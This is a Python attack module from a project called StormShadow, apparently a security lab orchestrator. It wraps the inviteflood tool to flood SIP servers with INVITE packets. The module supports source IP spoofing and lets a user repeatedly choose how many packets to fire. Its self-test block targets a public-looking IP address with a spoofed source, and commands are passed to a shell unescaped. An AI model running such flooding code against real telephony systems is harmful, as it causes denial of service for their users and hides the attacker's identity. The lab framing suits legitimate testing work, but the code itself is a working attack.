"""
InviteFlood Attack Module.

Implements SIP INVITE flood attacks using the inviteflood tool.
This module integrates with the StormShadow orchestrator architecture.
"""

import asyncio
import logging
import socket
import time
from typing import Dict, Any, List, Optional
from pathlib import Path
import sys

# Add project root to path for proper imports
project_root = Path(__file__).parent.parent.parent
if str(project_root) not in sys.path:
    sys.path.insert(0, str(project_root))

# Import from utils modules
from utils.registry.lab_module import AttackModule

# Module information for the registry
MODULE_INFO = {
    'description': 'SIP INVITE Flood Attack',
    'version': '1.0.0',
    'author': 'StormShadow Team',
    'requirements': ['inviteflood'],
    'supported_configs': ['local-attack-config.toml']
}

def setup_logging(level='INFO'):
    """Simple logger setup function."""
    logger = logging.getLogger(__name__)
    logger.setLevel(getattr(logging, level.upper(), logging.INFO))
    if not logger.handlers:
        handler = logging.StreamHandler()
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
    return logger

def validate_ip_address(ip):
    """Simple IP validation function."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

async def run_command_async(command, timeout=None):
    """Simple async wrapper for subprocess."""
    try:
        proc = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        
        return proc.returncode, stdout.decode(), stderr.decode()
    except asyncio.TimeoutError:
        if 'proc' in locals():
            proc.kill()
            await proc.wait()
        return -1, "", "Command timed out"
    except Exception as e:
        return -1, "", str(e)


class InviteFloodAttackModule(AttackModule):
    """
    SIP INVITE flood attack module.
    
    Uses the inviteflood tool to perform SIP flooding attacks against
    target SIP servers.
    """
    
    def __init__(self, name: str, config: Dict[str, Any]):
        """Initialize InviteFlood attack module."""
        super().__init__(name, config)
        
        # Setup logger
        self.logger = setup_logging(level='INFO')
        
        # Configuration with defaults
        self.target_ip = config.get('target_ip', '127.0.0.1')
        self.target_port = config.get('target_port', 5060)
        self.interface = config.get('interface', 'wlan0')
        self.sip_user = config.get('sip_user', '200')
        self.count = config.get('count', 1000)
        self.rate = config.get('rate', '100/s')
        self.loop = config.get('loop', False)
        self.source_ip = config.get('source_ip', None)
        self.source_port = config.get('source_port', None)
        
        # Tool configuration
        self.inviteflood_path = config.get('inviteflood_path', 'inviteflood')
        self.timeout = config.get('timeout', 30)
        
        # Spoofing configuration
        self.use_spoofing = config.get('use_spoofing', False)
        
        # State tracking
        self._is_running = False
        self.process = None
        
        # Results tracking
        self.results = {
            'success': False,
            'packets_sent': 0,
            'errors': [],
            'start_time': None,
            'end_time': None
        }
        
        # Validate configuration
        self._validate_config()
    
    def _validate_config(self):
        """Validate attack configuration."""
        if not validate_ip_address(self.target_ip):
            raise ValueError(f"Invalid target IP: {self.target_ip}")
        
        if not (1 <= self.target_port <= 65535):
            raise ValueError(f"Invalid target port: {self.target_port}")
        
        if self.count <= 0:
            raise ValueError(f"Invalid count: {self.count}")
        
        self.logger.info("Configuration validated successfully")
    
    async def start(self) -> bool:
        """Start the attack module in interactive mode."""
        try:
            if self._is_running:
                self.logger.warning("Attack is already running")
                return False
            
            self.logger.info(f"Starting InviteFlood attack: {self.name}")
            self._log_attack_details()
            
            # Record start time
            self.results['start_time'] = time.time()
            self._is_running = True
            
            # Run interactive loop instead of single execution
            await self._interactive_loop()
            
            return True
            
        except Exception as e:
            self._is_running = False
            self.results['success'] = False
            self.results['errors'].append(str(e))
            self.logger.error(f"Attack error: {e}")
            return False
    
    async def stop(self) -> bool:
        """Stop the attack module."""
        try:
            if not self._is_running:
                self.logger.warning("Attack is not running")
                return True
            
            self.logger.info(f"Stopping attack: {self.name}")
            
            if self.process:
                self.process.terminate()
                try:
                    await asyncio.wait_for(self.process.wait(), timeout=5.0)
                except asyncio.TimeoutError:
                    self.process.kill()
                    await self.process.wait()
            
            self._is_running = False
            self.logger.info("Attack stopped successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Error stopping attack: {e}")
            return False
    
    async def execute(self) -> bool:
        """Execute the attack (same as start for this module)."""
        return await self.start()
    
    async def configure(self) -> bool:
        """Configure the attack module."""
        try:
            # Configuration is done in __init__, just validate it's correct
            self._validate_config()
            self.logger.info("Attack configuration completed successfully")
            return True
        except Exception as e:
            self.logger.error(f"Configuration failed: {e}")
            return False
    
    async def get_status(self) -> Dict[str, Any]:
        """Get attack status."""
        return {
            'name': self.name,
            'type': 'inviteflood',
            'running': self._is_running,
            'target': f"{self.target_ip}:{self.target_port}",
            'count': self.count,
            'rate': self.rate,
            'spoofing': self.use_spoofing,
            'results': self.results.copy()
        }
    
    async def get_results(self) -> Dict[str, Any]:
        """Get attack results."""
        return self.results.copy()
    
    def _build_command(self) -> str:
        """Build the inviteflood command."""
        # Basic inviteflood command: inviteflood interface user target_ip dest_ip count
        command_parts = [
            self.inviteflood_path,
            self.interface,
            self.sip_user,
            self.target_ip,
            self.target_ip,  # destination IP
            str(self.count)
        ]
        
        # Add source IP if specified (for spoofing)
        if self.source_ip:
            command_parts.extend(['-i', self.source_ip])
        
        # Add source port if specified, otherwise use a non-SIP port
        if self.source_port:
            command_parts.extend(['-S', str(self.source_port)])
        else:
            # Use a different port to avoid conflict with SIP default port 5060
            command_parts.extend(['-S', '4000'])
        
        return ' '.join(command_parts)
    
    def _log_attack_details(self):
        """Log attack configuration details."""
        self.logger.info("Attack Configuration:")
        self.logger.info(f"  Target: {self.target_ip}:{self.target_port}")
        self.logger.info(f"  Interface: {self.interface}")
        self.logger.info(f"  SIP User: {self.sip_user}")
        self.logger.info(f"  Packet Count: {self.count}")
        self.logger.info(f"  Rate: {self.rate}")
        self.logger.info(f"  Loop Mode: {self.loop}")
        if self.source_ip:
            self.logger.info(f"  Source IP (spoofed): {self.source_ip}")
        if self.source_port:
            self.logger.info(f"  Source Port: {self.source_port}")

    async def _interactive_loop(self):
        """Interactive loop for attack management like the shell version."""
        print("\n" + "="*60)
        print(f"  StormShadow InviteFlood Attack - {self.name}")
        print("="*60)
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Interface: {self.interface}")
        print(f"SIP User: {self.sip_user}")
        if self.use_spoofing:
            print(f"Spoofing: ENABLED")
            if self.source_ip:
                print(f"Source IP: {self.source_ip}")
            if self.source_port:
                print(f"Source Port: {self.source_port}")
        else:
            print(f"Spoofing: DISABLED")
        print("="*60)
        
        total_packets_sent = 0
        
        while self._is_running:
            try:
                print(f"\nTotal packets sent so far: {total_packets_sent}")
                user_input = input("Enter number of SIP INVITE packets to send (or 'q' to quit): ").strip()
                
                if user_input.lower() in ['q', 'quit', 'exit']:
                    print("Exiting attack...")
                    break
                
                try:
                    packet_count = int(user_input)
                    if packet_count <= 0:
                        print("Please enter a positive number.")
                        continue
                        
                    print(f"Sending {packet_count} SIP INVITE packets to {self.target_ip}...")
                    
                    # Build command with the specified packet count
                    temp_count = self.count
                    self.count = packet_count
                    command = self._build_command()
                    self.count = temp_count  # Restore original count
                    
                    self.logger.info(f"Executing: {command}")
                    
                    # Execute the attack
                    returncode, stdout, stderr = await run_command_async(command, timeout=self.timeout)
                    
                    if returncode == 0:
                        total_packets_sent += packet_count
                        self.results['packets_sent'] = total_packets_sent
                        self.results['success'] = True
                        print(f"✓ Successfully sent {packet_count} packets")
                        if stdout.strip():
                            print(f"Output: {stdout.strip()}")
                    else:
                        self.results['success'] = False
                        error_msg = f"Command failed with return code {returncode}"
                        if stderr:
                            error_msg += f": {stderr}"
                        self.results['errors'].append(error_msg)
                        print(f"✗ Attack failed: {error_msg}")
                        
                except ValueError:
                    print("Invalid input. Please enter a number or 'q' to quit.")
                    continue
                    
            except KeyboardInterrupt:
                print("\nReceived Ctrl+C, exiting...")
                break
            except EOFError:
                print("\nEOF received, exiting...")
                break
            except Exception as e:
                self.logger.error(f"Error in interactive loop: {e}")
                print(f"Error: {e}")
                break
        
        # Record end time
        self.results['end_time'] = time.time()
        self._is_running = False
        print(f"\nAttack session ended. Total packets sent: {total_packets_sent}")
        print("Press Enter to close this terminal...")
        try:
            input()
        except:
            pass


# Module registration - this is what the orchestrator looks for
MODULE_CLASS = InviteFloodAttackModule


if __name__ == "__main__":
    """Test InviteFlood attack module independently."""
    async def test_inviteflood_attack():
        """Test InviteFlood attack functionality."""
        config = {
            'target_ip': '143.53.142.93',
            'target_port': 5060,
            'interface': 'wlan0',
            'sip_user': '200',
            'count': 10,  # Small count for testing
            'rate': '10/s',
            'loop': False,
            'timeout': 30,
            'source_ip': '10.10.123.42',  # Spoofed IP
            'source_port': 4000
        }
        
        attack = InviteFloodAttackModule('test-attack', config)
        
        print("Testing InviteFlood attack module...")
        
        try:
            # Test configuration
            status = await attack.get_status()
            print(f"Initial status: {status}")
            
            # Show the command that will be executed
            command = attack._build_command()
            print(f"Command to execute: {command}")
            
            # Test execution
            print("Executing attack...")
            success = await attack.execute()
            print(f"Execution: {'✓' if success else '✗'}")
            
            # Test results
            results = await attack.get_results()
            print(f"Results: {results}")
            
        except Exception as e:
            print(f"Test failed: {e}")
            import traceback
            traceback.print_exc()
    
    # Run the test
    asyncio.run(test_inviteflood_attack())
